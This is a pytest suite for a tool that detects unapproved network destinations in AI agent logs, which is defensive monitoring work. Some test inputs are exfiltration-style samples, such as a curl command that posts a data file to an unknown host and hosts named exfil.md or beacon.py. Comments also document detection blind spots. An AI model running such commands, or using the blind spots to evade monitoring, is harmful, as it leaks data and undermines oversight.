# agent-certify — Structural verification of multiagent systems
# Copyright 2026 Cognitive Engineering (Switzerland)
# SPDX-License-Identifier: Apache-2.0
"""Network destinations: extraction from logs, pattern matching, decisions and detection."""
import json

import pytest
from conftest import session_graph

from agent_certify import AgentFIScanner, AnomalyDetector, BaselineLearner, ClaudeCodeParser
from agent_certify.anomaly import CRITICAL
from agent_certify.baseline import carry_overrides, load_baseline
from agent_certify.cli import main
from agent_certify.domains import (
    domain_matches,
    extract_call_domains,
    extract_domains,
    matching_pattern,
    normalise_host,
    normalise_pattern,
)


def detect(graph, baseline):
    return AnomalyDetector(baseline, "test").detect(graph, AgentFIScanner(graph).scan())


def domain_anomalies(graph, baseline):
    return [a for a in detect(graph, baseline).anomalies if a.category in ("new_domain", "rejected_domain")]


def session(name, domains, tool="WebFetch"):
    """A session whose ``tool`` calls reached ``domains``."""
    g = session_graph(name, {tool: 4, "Read": 2})
    g.record_domains(f"tool:{tool}", set(domains))
    return g


@pytest.fixture
def baseline():
    """Learned from three sessions that only ever called api.openai.com."""
    return BaselineLearner().learn_graphs([session(f"s{i}", {"api.openai.com"}) for i in range(3)])


# -------------------------------------------------------------- extraction
@pytest.mark.parametrize("payload,expected", [
    ({"url": "https://api.openai.com/v1/chat"}, {"api.openai.com"}),
    ({"url": "HTTPS://API.OpenAI.COM:443/v1"}, {"api.openai.com"}),
    ({"command": "curl -s https://api.unknown.cn/collect -d @data"}, {"api.unknown.cn"}),
    ({"endpoint": "wss://stream.example.io/socket"}, {"stream.example.io"}),
    ({"host": "db.internal.corp"}, {"db.internal.corp"}),
    ({"endpoint": {"host": "1.2.3.4", "port": 5432}}, {"1.2.3.4"}),
    ({"urls": ["https://a.example/x", "http://user:pw@B.example:8080/y"]}, {"a.example", "b.example"}),
    ({"body": {"deep": {"nested": {"text": "see http://deep.example/z"}}}}, {"deep.example"}),
    ({"base_url": "https://eu.example.com", "model": "x"}, {"eu.example.com"}),
])
def test_domains_are_extracted(payload, expected):
    assert extract_domains(payload) == expected


@pytest.mark.parametrize("payload", [
    {"pattern": "alibaba.com", "path": "notes.md"},          # a bare domain in a non-network field
    {"text": "contact us at example.com for details"},
    {"file_path": "notes.md"},
    {"address": "report.pdf"},                                # a filename in a network-named field
    {"query": "who owns openai.com?"},
    "example.com",
    None,
    42,
])
def test_mentions_are_not_destinations(payload):
    """A domain the session merely talked about is not a place it went."""
    assert extract_domains(payload) == set()


def test_a_result_is_read_only_when_the_call_itself_went_somewhere():
    """A fetch's redirects count; a file full of URLs does not."""
    assert extract_call_domains({"url": "https://api.example.com"},
                                "302 -> https://eu.api.example.com/v1") == {"api.example.com",
                                                                            "eu.api.example.com"}
    assert extract_call_domains({"file_path": "notes.md"}, "see https://leaked.example.org/") == set()


def test_extraction_is_bounded():
    """Untrusted logs: a huge or deeply nested argument costs bounded work."""
    deep = current = {}
    for i in range(50):
        current["next"] = current = {}
    current["url"] = "https://too.deep.example/"
    assert extract_domains(deep) == set()                     # past MAX_SCAN_DEPTH
    wide = {"command": " ".join(f"https://h{i}.example/" for i in range(500))}
    assert len(extract_domains(wide)) <= 200                  # MAX_DOMAINS


# ----------------------------------------------- adversarial: false negatives
# The suite above measures what extraction finds. These measure what it must
# not silently drop: a destination present in the logs and never recorded is
# never compared against a baseline and never reported, and a detector that
# stays quiet is worse than one that is noisy.
@pytest.mark.parametrize("payload,expected", [
    # A final label that is both a file extension and a delegated TLD. Each of
    # these was dropped by NOT_HOSTS before the v0.7.0 audit.
    ({"host": "collector.zip"}, {"collector.zip"}),            # .zip: delegated gTLD, open registration
    ({"endpoint": "data.sh"}, {"data.sh"}),                    # .sh: Saint Helena
    ({"base_url": "x.so"}, {"x.so"}),                          # .so: Somalia
    ({"host": "exfil.md"}, {"exfil.md"}),                      # .md: Moldova
    ({"api_host": "beacon.py"}, {"beacon.py"}),                # .py: Paraguay
    ({"proxy": "relay.rs"}, {"relay.rs"}),                     # .rs: Serbia
    # Bare-host form under every shape of network-named key, with no scheme to
    # anchor the regex.
    ({"hostname": "db.internal.corp"}, {"db.internal.corp"}),
    ({"webhook_url": "hooks.unknown.cn"}, {"hooks.unknown.cn"}),
    ({"api_url": "EU.Example.COM."}, {"eu.example.com"}),
    ({"hosts": ["a.example.net", "b.example.net"]}, {"a.example.net", "b.example.net"}),
    ({"endpoint": {"host": "deep.example.org"}}, {"deep.example.org"}),
])
def test_a_real_destination_is_never_silently_dropped(payload, expected):
    assert extract_domains(payload) == expected


def test_every_not_hosts_label_is_absent_from_the_dns_root():
    """A label that is both a file extension and a TLD turns the filter into an egress hole."""
    from agent_certify.domains import NOT_HOSTS

    # A sample of the root zone, weighted toward labels that also read as file
    # extensions. The six that used to be on the list come first.
    delegated = {"zip", "sh", "so", "md", "py", "rs",
                 "io", "dev", "app", "ai", "co", "tv", "me", "to", "ly", "cc", "in", "it", "is",
                 "au", "de", "fr", "ch", "cloud", "page", "zone", "link", "build", "run", "how"}
    assert NOT_HOSTS & delegated == set()
    assert all(label and label.isalnum() for label in NOT_HOSTS)


def test_a_bare_host_is_truncated_like_a_url_search():
    """MAX_STRING_CHARS is announced for *any* string; the bare-host branch must honour it too."""
    from agent_certify.domains import MAX_STRING_CHARS

    # A host hidden past the limit is out of scope, as it is for the URL search.
    assert extract_domains({"host": "x" * (MAX_STRING_CHARS + 10) + " api.openai.com"}) == set()
    # And a value that long costs bounded work rather than several full copies.
    assert extract_domains({"host": "a" * (4 * MAX_STRING_CHARS)}) == set()


def test_a_host_in_a_shell_command_is_a_known_blind_spot():
    """Documented and measured by the benchmark's shell_domain injection, not asserted away."""
    assert extract_call_domains({"command": "curl -sS collector.example.net/health"}) == set()
    # With a scheme it is found, which is what makes the gap specific.
    assert extract_call_domains({"command": "curl -sS https://collector.example.net/health"}) == {
        "collector.example.net"}


def test_merge_keeps_every_callers_destinations():
    """Two sessions, the same tool, different hosts: both must name their caller.

    seen_domains was unioned on merge while the per-node copy was set by
    default, so the second session's host survived as a destination with no
    caller — and the anomaly degraded to "no caller recorded" on exactly the
    path `scan <directory>` takes.
    """
    from agent_certify.graph import AgentGraph

    a = session("a", {"api.openai.com"})
    b = session("b", {"api.unknown.cn"})
    merged = AgentGraph.merge([a, b], session_id="merged")
    assert merged.seen_domains == {"api.openai.com", "api.unknown.cn"}
    assert merged.domain_callers("api.openai.com") == ["tool:WebFetch"]
    assert merged.domain_callers("api.unknown.cn") == ["tool:WebFetch"]
    assert merged.nodes["tool:WebFetch"].metadata["domains"] == ["api.openai.com", "api.unknown.cn"]


def test_merged_destinations_are_reported_with_their_caller(baseline):
    """The observable consequence of the merge fix, through the detector."""
    from agent_certify.graph import AgentGraph

    merged = AgentGraph.merge([session("a", {"api.openai.com"}),
                               session("b", {"api.unknown.cn"})], session_id="merged")
    hits = domain_anomalies(merged, baseline)
    assert [a.value for a in hits] == ["api.unknown.cn"]
    assert hits[0].detail == "reached by tool:WebFetch"
    assert "no caller recorded" not in hits[0].detail


def test_host_normalisation():
    assert normalise_host("User:pw@API.OpenAI.com:443.") == "api.openai.com"
    assert normalise_host("[::1]:8080") == "[::1]"
    assert normalise_host("") is None and normalise_host(None) is None


def test_extraction_from_a_real_transcript(tmp_path):
    """End to end through the Claude Code parser, including the result gate."""
    proj = tmp_path / "-home-me-proj"
    proj.mkdir()
    records = [
        {"type": "assistant", "timestamp": "2026-11-03T10:00:00Z", "message": {"role": "assistant", "content": [
            {"type": "tool_use", "id": "t1", "name": "WebFetch", "input": {"url": "https://api.openai.com/v1"}},
            {"type": "tool_use", "id": "t2", "name": "Read", "input": {"file_path": "notes.md"}}]}},
        {"type": "user", "timestamp": "2026-11-03T10:00:03Z", "message": {"role": "user", "content": [
            {"type": "tool_result", "tool_use_id": "t1", "content": "302 -> https://eu.openai.com/v1"},
            {"type": "tool_result", "tool_use_id": "t2", "content": "mentions https://unrelated.example/"}]}},
    ]
    (proj / "s.jsonl").write_text("\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8")
    g = ClaudeCodeParser().parse(str(proj / "s.jsonl"))
    assert g.seen_domains == {"api.openai.com", "eu.openai.com"}
    assert g.nodes["tool:WebFetch"].metadata["domains"] == ["api.openai.com", "eu.openai.com"]
    assert "domains" not in g.nodes["tool:Read"].metadata
    assert g.domain_callers("eu.openai.com") == ["tool:WebFetch"]


# ---------------------------------------------------------- pattern matching
@pytest.mark.parametrize("domain,pattern,matches", [
    ("api.openai.com", "api.openai.com", True),
    ("other.openai.com", "api.openai.com", False),
    ("API.OpenAI.com", "api.openai.com", True),
    ("api.unknown.cn", "*.cn", True),
    ("deep.sub.unknown.cn", "*.cn", True),
    ("cn", "*.cn", False),
    ("notcn", "*.cn", False),
    ("x.alibaba.com", "*.alibaba.com", True),
    ("alibaba.com", "*.alibaba.com", False),            # a wildcard covers subdomains only
    ("x.y.alibaba.com", "*.alibaba.com", True),
    ("evil-alibaba.com", "*.alibaba.com", False),
])
def test_domain_matches(domain, pattern, matches):
    assert domain_matches(domain, pattern) is matches


def test_pattern_normalisation():
    assert normalise_pattern(".cn") == "*.cn"
    assert normalise_pattern("*.Alibaba.COM") == "*.alibaba.com"
    assert normalise_pattern("https://api.openai.com/v1/chat") == "api.openai.com"
    assert normalise_pattern("  api.openai.com.  ") == "api.openai.com"


@pytest.mark.parametrize("bad,message", [
    ("", "empty"),
    ("   ", "empty"),
    ("*", "every host"),
    ("a.*.com", "leading"),
])
def test_bad_patterns_say_what_was_expected(bad, message):
    with pytest.raises(ValueError, match=message):
        normalise_pattern(bad)


def test_the_most_specific_pattern_is_the_one_reported():
    assert matching_pattern("api.unknown.cn", ["*.cn", "api.unknown.cn"]) == "api.unknown.cn"
    assert matching_pattern("other.cn", ["*.cn", "api.unknown.cn"]) == "*.cn"
    assert matching_pattern("api.openai.com", ["*.cn"]) is None


# ------------------------------------------------------------- the baseline
def test_baseline_learns_the_destinations(baseline):
    assert baseline.known_domains == {"api.openai.com"}
    assert not baseline.has_overrides


def test_accepted_domain_passes(baseline):
    baseline.accepted_domains.add("*.openai.com")
    assert domain_anomalies(session("new", {"eu.openai.com"}), baseline) == []
    # Acceptance is scoped to the pattern: another host still fires.
    assert len(domain_anomalies(session("other", {"api.unknown.cn"}), baseline)) == 1


def test_new_domain_is_critical(baseline):
    hits = domain_anomalies(session("s", {"api.unknown.cn"}), baseline)
    assert len(hits) == 1 and hits[0].severity == CRITICAL and hits[0].category == "new_domain"
    assert hits[0].message == "Network destination api.unknown.cn in tool call — not in baseline"
    assert hits[0].value == "api.unknown.cn" and "reached by tool:WebFetch" in hits[0].detail
    assert detect(session("s", {"api.unknown.cn"}), baseline).has_critical


def test_rejected_domain_is_critical_even_when_learned(baseline):
    """The point of rejecting: a host the baseline learned as normal still fires."""
    baseline.rejected_domains.add("api.openai.com")
    hits = domain_anomalies(session("s", {"api.openai.com"}), baseline)
    assert len(hits) == 1 and hits[0].category == "rejected_domain" and hits[0].severity == CRITICAL
    assert hits[0].message == ("Network destination api.openai.com in tool call — "
                               "matches rejected pattern api.openai.com")
    assert "across re-learns" in hits[0].detail


def test_rejected_wildcard_names_the_pattern_and_the_absence(baseline):
    baseline.rejected_domains.add("*.cn")
    hits = domain_anomalies(session("s", {"api.unknown.cn"}), baseline)
    assert hits[0].message == ("Network destination api.unknown.cn in tool call — not in baseline, "
                               "matches rejected pattern *.cn")


def test_reject_beats_accept(baseline):
    """Same precedence as tools: a rejected pattern wins over an accepting one."""
    baseline.accepted_domains.add("*.cn")
    baseline.rejected_domains.add("*.cn")
    hits = domain_anomalies(session("s", {"api.unknown.cn"}), baseline)
    assert len(hits) == 1 and hits[0].category == "rejected_domain"


def test_several_destinations_are_reported_once_each(baseline):
    hits = domain_anomalies(session("s", {"a.example", "b.example", "api.openai.com"}), baseline)
    assert [a.value for a in hits] == ["a.example", "b.example"]


def test_decisions_survive_a_relearn(baseline):
    """A re-learn recomputes statistics; it must not undo a rejection."""
    baseline.rejected_domains.add("*.cn")
    baseline.accepted_domains.add("api.partner.io")
    relearned = BaselineLearner().learn_graphs([session("new", {"api.unknown.cn", "api.partner.io"})])
    assert relearned.known_domains == {"api.unknown.cn", "api.partner.io"}
    carry_overrides(relearned, baseline)
    assert relearned.rejected_domains == {"*.cn"} and relearned.accepted_domains == {"api.partner.io"}
    # Learned in every session now, and still an anomaly.
    hits = domain_anomalies(session("s", {"api.unknown.cn"}), relearned)
    assert len(hits) == 1 and hits[0].category == "rejected_domain"


def test_baseline_file_round_trip(tmp_path, baseline):
    baseline.accepted_domains.add("api.openai.com")
    baseline.rejected_domains.add("*.cn")
    path = BaselineLearner().save(baseline, tmp_path / "baseline.json")
    loaded = load_baseline(path)
    assert loaded.accepted_domains == {"api.openai.com"}
    assert loaded.rejected_domains == {"*.cn"}
    assert loaded.known_domains == {"api.openai.com"}
    stored = json.loads(path.read_text(encoding="utf-8"))
    assert stored["rejected_domains"] == ["*.cn"]            # patterns, not resolved addresses


# --------------------------------------------------------------------- CLI
@pytest.fixture
def cli_baseline(tmp_path, baseline):
    return str(BaselineLearner().save(baseline, tmp_path / "baseline.json"))


def test_cli_accept_and_reject_domains(capsys, cli_baseline):
    assert main(["baseline", "accept", "--domain", "api.openai.com", "--baseline", cli_baseline]) == 0
    assert "accepted domain: api.openai.com" in capsys.readouterr().out
    assert main(["baseline", "reject", "--domain", "*.cn", "--domain", ".alibaba.com",
                 "--baseline", cli_baseline]) == 0
    out = capsys.readouterr().out
    assert "rejected domain: *.cn" in out and "rejected domain: *.alibaba.com" in out
    b = load_baseline(cli_baseline)
    assert b.accepted_domains == {"api.openai.com"} and b.rejected_domains == {"*.cn", "*.alibaba.com"}


def test_cli_last_decision_wins(capsys, cli_baseline):
    assert main(["baseline", "reject", "--domain", "api.openai.com", "--baseline", cli_baseline]) == 0
    assert "already learned as normal" in capsys.readouterr().out
    assert main(["baseline", "accept", "--domain", "api.openai.com", "--baseline", cli_baseline]) == 0
    assert "was rejected; the newer decision wins" in capsys.readouterr().out
    b = load_baseline(cli_baseline)
    assert b.accepted_domains == {"api.openai.com"} and b.rejected_domains == set()


def test_cli_show_includes_domains(capsys, cli_baseline):
    main(["baseline", "accept", "--domain", "api.openai.com", "--baseline", cli_baseline])
    main(["baseline", "reject", "--domain", "*.cn", "--baseline", cli_baseline])
    capsys.readouterr()
    assert main(["baseline", "show", "--baseline", cli_baseline]) == 0
    out = capsys.readouterr().out
    assert "Accepted domains (1):" in out and "api.openai.com" in out
    assert "Rejected domains (1):" in out and "*.cn" in out
    assert "Destinations learned (1):" in out

    assert main(["baseline", "show", "--format", "json", "--baseline", cli_baseline]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["accepted_domains"] == ["api.openai.com"] and data["rejected_domains"] == ["*.cn"]
    assert data["known_domains"] == ["api.openai.com"]


def test_cli_rejects_a_bad_pattern(capsys, cli_baseline):
    with pytest.raises(SystemExit, match="every host"):
        main(["baseline", "reject", "--domain", "*", "--baseline", cli_baseline])
    with pytest.raises(SystemExit, match="nothing to reject"):
        main(["baseline", "reject", "--baseline", cli_baseline])
    with pytest.raises(SystemExit, match="nothing to accept"):
        main(["baseline", "accept", "--baseline", cli_baseline])


def test_cli_learn_reports_destinations(capsys, tmp_path, monkeypatch):
    proj = tmp_path / "proj"
    proj.mkdir()
    records = [{"type": "assistant", "message": {"role": "assistant", "content": [
        {"type": "tool_use", "id": "t1", "name": "WebFetch", "input": {"url": "https://api.openai.com/v1"}}]}}]
    (proj / "s.jsonl").write_text(json.dumps(records[0]) + "\n", encoding="utf-8")
    assert main(["learn", str(proj), "-o", str(tmp_path / "b.json")]) == 0
    assert "Destinations:  1  (api.openai.com)" in capsys.readouterr().out


def test_scan_json_carries_the_destinations(capsys, tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    rec = {"type": "assistant", "message": {"role": "assistant", "content": [
        {"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "curl https://api.unknown.cn/x"}}]}}
    (proj / "s.jsonl").write_text(json.dumps(rec) + "\n", encoding="utf-8")
    assert main(["scan", str(proj / "s.jsonl"), "--format", "json", "--no-baseline", "--no-policy"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["graph"]["seen_domains"] == ["api.unknown.cn"]
